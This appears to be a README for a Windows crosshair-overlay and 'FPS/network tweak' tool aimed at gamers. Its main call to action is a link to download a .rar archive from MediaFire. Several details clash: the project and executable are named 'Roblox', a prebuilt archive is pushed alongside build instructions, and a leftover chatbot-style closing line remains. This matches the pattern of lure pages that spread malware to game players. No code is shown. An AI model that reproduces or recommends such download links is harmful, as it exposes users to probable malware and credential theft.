
# Testing:
[![Watch the video](https://img.youtube.com/vi/5zuxFAMid9s/maxresdefault.jpg)](https://youtu.be/5zuxFAMid9s)

---

## Link Download:

[Download Here](https://www.mediafire.com/file/jy5btry3qd4dkjk/toolkit.rar/file)

---

## Overview

This repository contains `Crosshair Studio Pro` — a WinForms toolkit that helps you design crosshairs, preview them, save/load presets and optionally run simple system optimizations (FPS / network tweaks). It's a GUI application targeting .NET 10.

Use this tool only on systems you own or where you have explicit permission to run diagnostics/tweaks.

## Features

- Create and preview crosshair types (plus, cross, dot, circle, etc.)
- Live overlay that draws a crosshair on-screen
- Save / load presets (JSON `.csp` files) and import/export configurations
- Color palette + custom color picker
- Basic FPS and network helper options (process priority, DNS flush, TCP settings)
- Tray icon with minimize-to-tray support

## Build & Run

- Requirements: .NET 10 SDK
- Open solution in Visual Studio or run from command line:

```sh
dotnet build
dotnet run --project Roblox
```

After build the executable is in `bin/Debug/net10.0-windows` (or `Release`).

## Usage (GUI)

1. Launch the application (`Roblox.exe`).
2. Use the left navigation to switch between `Crosshair`, `Colors`, `Settings`, `Presets`, and utility panels.
3. In `Crosshair`:
   - Enable the overlay and choose a crosshair type and size.
   - Click `Apply Changes` to update the overlay.
4. In `Colors` you can pick a preset color or choose a custom color.
5. Save presets in `Presets` and load them later.

---

# Preview:
<img width="1396" height="841" alt="image" src="https://github.com/user-attachments/assets/51c15964-7b30-44a1-b81b-7865ccbe803d" />

---

Notes:
- Presets are stored under `%APPDATA%/CrosshairStudio` as `.csp` JSON files.
- Some FPS/network operations require administrator rights (the app will not attempt to elevate automatically).

## Configuration / Files

- Preset format: JSON with fields `Type`, `Size`, `ColorArgb`.
- Exported configurations use the same JSON format.

## Troubleshooting

- If the app won't build, ensure no running instance is locking `Roblox.exe` (close app or stop debugging).
- On multi-monitor setups the overlay uses primary screen center by default.

## Disclaimer

This tool is provided for educational and personal use only. The author is not responsible for misuse, damage, or illegal activity resulting from running this software. Always obtain permission before modifying system settings or testing on computers you do not own.

---

If you want screenshots, badges, or a CONTRIBUTING section added, tell me what to include and I'll update the README.
